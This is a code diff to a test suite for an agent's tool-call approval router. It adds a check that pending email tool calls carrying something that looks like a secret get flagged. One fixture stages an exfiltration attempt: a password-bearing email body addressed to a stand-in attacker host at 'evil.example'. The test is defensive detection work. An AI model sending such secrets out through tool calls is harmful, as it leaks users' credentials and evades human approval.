@@ -18,11 +18,17 @@ vi.mock('@/server/services/aiAgent', () => ({
   AiAgentService: vi.fn().mockImplementation(() => ({ execAgent: mockExecAgent })),
 }));
 
-const addToolCall = async (userId: string, id: string, agentId: string, topicId: string) => {
+const addToolCall = async (
+  userId: string,
+  id: string,
+  agentId: string,
+  topicId: string,
+  args: object = { to: 'ana@example.com' },
+) => {
   await testDB.insert(messages).values({ agentId, content: '', id, role: 'tool', topicId, userId });
   await testDB.insert(messagePlugins).values({
     apiName: 'send_email',
-    arguments: '{"to":"ana@example.com"}',
+    arguments: JSON.stringify(args),
     id,
     identifier: 'gmail-mcp',
     intervention: { status: 'pending' },
@@ -68,7 +74,22 @@ describe('mobile approvalRouter', () => {
     const pending = await callerFor(owner.userId).listPending();
 
     expect(pending.map((item) => item.id)).toEqual(['tool-owner']);
-    expect(pending[0]).toMatchObject({ apiName: 'send_email', topicId: owner.topicId });
+    expect(pending[0]).toMatchObject({
+      apiName: 'send_email',
+      secrets: [],
+      topicId: owner.topicId,
+    });
+  });
+
+  it('says when a waiting call would send out what looks like a secret', async () => {
+    await addToolCall(owner.userId, 'tool-leak', owner.agentId, owner.topicId, {
+      body: 'The door code and password: Tr0ub4dor',
+      to: 'x@evil.example',
+    });
+
+    const pending = await callerFor(owner.userId).listPending();
+
+    expect(pending.find((item) => item.id === 'tool-leak')?.secrets).toEqual(['password']);
   });
 
   it('resumes the paused run with the approval, exactly once', async () => {
